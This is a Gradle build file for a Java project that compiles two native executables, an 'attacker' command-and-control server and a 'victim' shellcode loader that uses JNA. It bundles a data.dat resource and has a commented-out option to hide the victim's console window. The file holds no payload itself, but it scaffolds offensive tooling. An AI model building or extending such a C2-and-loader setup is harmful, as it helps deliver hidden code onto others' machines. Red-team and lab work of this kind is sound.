plugins {
    id 'application'
    id 'org.graalvm.buildtools.native' version '0.10.1'
}

repositories {
    mavenCentral()
}

dependencies {
    // For Attacker C2
    implementation 'org.bouncycastle:bcprov-jdk18on:1.80'
    implementation 'org.bouncycastle:bcpkix-jdk18on:1.80'

    // For Victim Shellcode Loader
    implementation 'net.java.dev.jna:jna:5.14.0'
    implementation 'net.java.dev.jna:jna-platform:5.14.0'
}

java {
    toolchain {
        // Keeps local compatibility with your Java 25
        languageVersion = JavaLanguageVersion.of(25)
    }
}

application {
    mainClass = 'shell.Attacker'
}

graalvmNative {
    binaries {
        // 1. Use 'configureEach' instead of 'all' for better Gradle performance
        configureEach {
            // 2. Setting the classpath correctly to avoid "cannot assign" errors
            classpath = files(tasks.named('jar'), configurations.runtimeClasspath)

            buildArgs.add('--no-fallback')
            buildArgs.add('--enable-all-security-services')
            buildArgs.add('--enable-https')
            buildArgs.add('-H:+AddAllCharsets')

            // BouncyCastle Config
            buildArgs.add('--initialize-at-build-time=org.bouncycastle')
            buildArgs.add('-H:+UnlockExperimentalVMOptions')
            buildArgs.add('-H:AdditionalSecurityProviders=org.bouncycastle.jce.provider.BouncyCastleProvider')
            buildArgs.add('--initialize-at-build-time=org.bouncycastle.jcajce.provider.asymmetric.rsa.DigestSignatureSpi')
            buildArgs.add('--initialize-at-build-time=org.bouncycastle.jcajce.provider.asymmetric.rsa.DigestSignatureSpi$SHA256')

            // Resource & JNA Config
            buildArgs.add('-H:IncludeResources=.*data\\.dat$')
            buildArgs.add('--initialize-at-run-time=com.sun.jna.Native')
        }

        register("attacker") {
            mainClass = 'shell.Attacker'
            imageName = 'attacker'
        }

        register("victim") {
            mainClass = 'shell.Victim'
            imageName = 'victim'
            // Optional: Uncomment the next line to hide the console window on Windows
            // buildArgs.add('-H:Win32SubSystem=windows')
        }
    }
}

tasks.named('test') {
    useJUnitPlatform()
}
